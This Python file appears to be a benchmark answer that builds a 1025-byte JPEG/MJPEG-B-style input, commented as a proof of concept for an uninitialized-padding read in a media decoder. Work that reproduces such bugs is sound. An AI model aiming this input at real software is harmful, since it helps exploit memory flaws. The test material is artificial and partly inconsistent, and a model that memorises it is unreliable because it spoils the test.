import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal valid MJPEG-B stream with uninitialized padding
        # Based on typical MJPEG-B structure with padding opportunities
        
        # Header structure
        poc = bytearray()
        
        # SOI marker
        poc.extend(b'\xFF\xD8')  # Start of Image
        
        # APP0 marker with minimal JFIF header
        poc.extend(b'\xFF\xE0')  # APP0 marker
        poc.extend(b'\x00\x10')  # Length = 16
        poc.extend(b'JFIF\x00\x01\x02')  # Identifier + version
        poc.extend(b'\x01')  # Density units
        poc.extend(b'\x00\x48\x00\x48')  # Xdensity, Ydensity = 72
        poc.extend(b'\x00\x00')  # Thumbnail dimensions
        
        # DQT marker (quantization table)
        poc.extend(b'\xFF\xDB')  # Define Quantization Table
        poc.extend(b'\x00\x43')  # Length = 67
        poc.extend(b'\x00')  # Table precision + destination
        # Fill with quantization values (64 bytes)
        for i in range(64):
            poc.append((i % 10) + 1)  # Simple pattern
        
        # SOF0 marker (baseline DCT)
        poc.extend(b'\xFF\xC0')  # Start of Frame
        poc.extend(b'\x00\x0B')  # Length = 11
        poc.extend(b'\x08')  # Precision
        poc.extend(b'\x00\x08')  # Height = 8
        poc.extend(b'\x00\x08')  # Width = 8
        poc.extend(b'\x01')  # Components
        poc.extend(b'\x01\x11\x00')  # Component parameters
        
        # DHT marker (Huffman table)
        poc.extend(b'\xFF\xC4')  # Define Huffman Table
        poc.extend(b'\x00\x1F')  # Length = 31
        poc.extend(b'\x00')  # Table class + destination
        # Bits distribution
        bits = [0, 1, 5, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0]
        poc.extend(bytes(bits))
        # Values
        for i in range(12):
            poc.append(i)
        
        # SOS marker
        poc.extend(b'\xFF\xDA')  # Start of Scan
        poc.extend(b'\x00\x08')  # Length = 8
        poc.extend(b'\x01')  # Components
        poc.extend(b'\x01\x00')  # Component selector
        poc.extend(b'\x00\x3F\x00')  # Spectral selection
        
        # Image data - designed to trigger padding issue
        # Use a small amount of actual data leaving room for padding
        poc.extend(b'\x00')  # Initial byte
        poc.extend(b'\x01\x02\x03\x04')  # Minimal image data
        
        # Add padding bytes that may be uninitialized
        # The vulnerability is triggered when padding bytes are read
        # We need enough data to cause buffer allocation with padding
        remaining = 1025 - len(poc)
        if remaining > 0:
            # Add filler to reach target length
            # Using pattern that might expose uninitialized memory
            poc.extend(b'\x00' * remaining)
        
        return bytes(poc[:1025])
